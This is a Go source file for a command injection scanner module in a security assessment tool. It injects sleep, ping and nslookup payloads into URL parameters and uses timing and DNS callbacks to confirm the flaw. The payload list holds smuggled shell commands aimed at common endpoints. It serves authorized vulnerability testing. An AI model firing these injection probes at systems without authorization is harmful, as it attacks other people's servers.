// Package cmdinj implements an OS command injection scanner using the same
// calibration-based timing analysis as the SQLi scanner. Payloads use sleep
// commands across different OS families (Unix, Windows).
//
// Detection flow:
//  1. Baseline latency measurement (median of 5 requests)//  2. Inject `; sleep 3` — verify delta > 2.5s over baseline
//  3. Confirm with `; sleep 5` — verify delta tracks proportionally
//  4. Optional: OOB confirmation via `nslookup TOKEN.oob.domain`
//
// Only runs in authorized mode (--authorized flag).
package cmdinj

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
)


func init() {
	scan.Register(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	})
}
const scannerName = "cmdinj"

type payload struct {
	name   string // human label
	os     string // unix, windows, any
	prefix string // injected before the sleep command
	sleepFn string // sleep command template (%d = seconds)
	suffix string // injected after
}

var payloads = []payload{
	// Unix — various injection contexts
	{name: "unix-semi", os: "unix", prefix: "; sleep ", sleepFn: "%d", suffix: " #"},
	{name: "unix-pipe", os: "unix", prefix: "| sleep ", sleepFn: "%d", suffix: ""},
	{name: "unix-backtick", os: "unix", prefix: "`sleep ", sleepFn: "%d", suffix: "`"},
	{name: "unix-subshell", os: "unix", prefix: "$(sleep ", sleepFn: "%d", suffix: ")"},
	{name: "unix-newline", os: "unix", prefix: "\nsleep ", sleepFn: "%d", suffix: "\n"},
	{name: "unix-and", os: "unix", prefix: "&& sleep ", sleepFn: "%d", suffix: ""},
	{name: "unix-or", os: "unix", prefix: "|| sleep ", sleepFn: "%d", suffix: ""},

	// Windows
	{name: "win-and-ping", os: "windows", prefix: "& ping -n ", sleepFn: "%d", suffix: " 127.0.0.1 >nul"},
	{name: "win-pipe-ping", os: "windows", prefix: "| ping -n ", sleepFn: "%d", suffix: " 127.0.0.1 >nul"},
	{name: "win-timeout", os: "windows", prefix: "& timeout /t ", sleepFn: "%d", suffix: " >nul"},
}

// Paths and parameters commonly vulnerable to command injection.
var probePaths = []struct {
	path   string
	params []string
}{
	{"/", []string{"cmd", "exec", "command", "run", "ping", "host", "ip"}},
	{"/api/v1/ping", []string{"host", "target", "ip"}},
	{"/admin/backup", []string{"file", "path", "dir"}},
	{"/tools/lookup", []string{"domain", "host", "ip", "target"}},
	{"/api/health", []string{"check", "host"}},
}

// Scanner checks for OS command injection via timing analysis.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := authctx.HTTPClient(ctx)
	client = &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		},
		Jar: client.Jar,
	}

	scheme := detectScheme(ctx, client, asset)
	if scheme == "" {
		return nil, nil
	}

	var findings []finding.Finding

	for _, pp := range probePaths {
		if ctx.Err() != nil {
			break
		}

		for _, param := range pp.params {
			if ctx.Err() != nil {
				break
			}

			baseURL := fmt.Sprintf("%s://%s%s?%s=test", scheme, asset, pp.path, param)

			baseline, err := measureBaseline(ctx, client, baseURL, 5)
			if err != nil {
				continue
			}

			for _, p := range payloads {
				if ctx.Err() != nil {
					break
				}

				// First probe: sleep 3
				injected3 := buildPayload(p, 3)
				testURL3 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+injected3))
				latency3, err := timeRequest(ctx, client, testURL3)
				if err != nil {
					continue
				}

				delta3 := latency3 - baseline
				if delta3 < 2500*time.Millisecond {
					continue
				}

				// Confirm: sleep 5
				injected5 := buildPayload(p, 5)
				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+injected5))
				latency5, err := timeRequest(ctx, client, testURL5)
				if err != nil {
					continue
				}

				delta5 := latency5 - baseline
				if delta5 < 4500*time.Millisecond {
					continue
				}

				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebCmdInjection,
					Module:   "surface",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Title:    fmt.Sprintf("OS command injection in %s parameter at %s", param, pp.path),
					Description: fmt.Sprintf(
						"Calibration-based timing confirmed command injection. "+
							"Baseline: %s, sleep(3) delta: %s, sleep(5) delta: %s. "+
							"OS type: %s. Payload: %s",
						baseline.Round(time.Millisecond), delta3.Round(time.Millisecond),
						delta5.Round(time.Millisecond), p.os, p.name),
					Asset: asset,
					Evidence: map[string]any{
						"path":            pp.path,
						"parameter":       param,
						"payload":         p.name,
						"os_type":         p.os,
						"baseline_ms":     baseline.Milliseconds(),
						"sleep3_delta_ms": delta3.Milliseconds(),
						"sleep5_delta_ms": delta5.Milliseconds(),
					},
					ProofCommand: fmt.Sprintf(
						`time curl -sk '%s'  # should take ~3s longer than baseline`,
						testURL3),
					DiscoveredAt: time.Now(),
				})
				break // one per parameter
			}

			// OOB confirmation
			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
				token := oobSrv.GenerateToken(fmt.Sprintf("cmdinj-%s-%s", pp.path, param))
				oobDomain := oobSrv.DNSHostname(token)

				oobPayloads := []string{
					fmt.Sprintf("; nslookup %s #", oobDomain),
					fmt.Sprintf("| nslookup %s", oobDomain),
					fmt.Sprintf("$(nslookup %s)", oobDomain),
					fmt.Sprintf("& nslookup %s", oobDomain),
				}

				for _, op := range oobPayloads {
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+op))
					_, _ = timeRequest(ctx, client, testURL)
				}

				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
					findings = append(findings, finding.Finding{
						CheckID:  finding.CheckWebCmdInjection,
						Module:   "surface",
						Scanner:  scannerName,
						Severity: finding.SeverityCritical,
						Title:    fmt.Sprintf("OOB command injection confirmed in %s at %s", param, pp.path),
						Description: fmt.Sprintf(
							"Out-of-band DNS callback received from %s after nslookup injection, "+
								"confirming OS command injection.", cb.RemoteAddr),
						Asset: asset,
						Evidence: map[string]any{
							"path":        pp.path,
							"parameter":   param,
							"oob_token":   token,
							"callback_ip": cb.RemoteAddr,
							"protocol":    cb.Protocol,
						},
						DiscoveredAt: time.Now(),
					})
				}
			}
		}
	}

	return findings, nil
}

func buildPayload(p payload, seconds int) string {
	sleep := fmt.Sprintf(p.sleepFn, seconds)
	return p.prefix + sleep + p.suffix
}

func measureBaseline(ctx context.Context, client *http.Client, rawURL string, n int) (time.Duration, error) {
	var latencies []time.Duration
	for i := 0; i < n; i++ {
		d, err := timeRequest(ctx, client, rawURL)
		if err != nil {
			return 0, err
		}
		latencies = append(latencies, d)
	}
	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
	return latencies[len(latencies)/2], nil
}

func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.Duration, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-cmdinj-scanner)")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return elapsed, err
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return elapsed, nil
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	host := asset
	if idx := strings.LastIndex(asset, ":"); idx != -1 {
		host = asset[:idx]
	}
	_ = host

	for _, scheme := range []string{"https", "http"} {
		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		return scheme
	}
	return ""
}
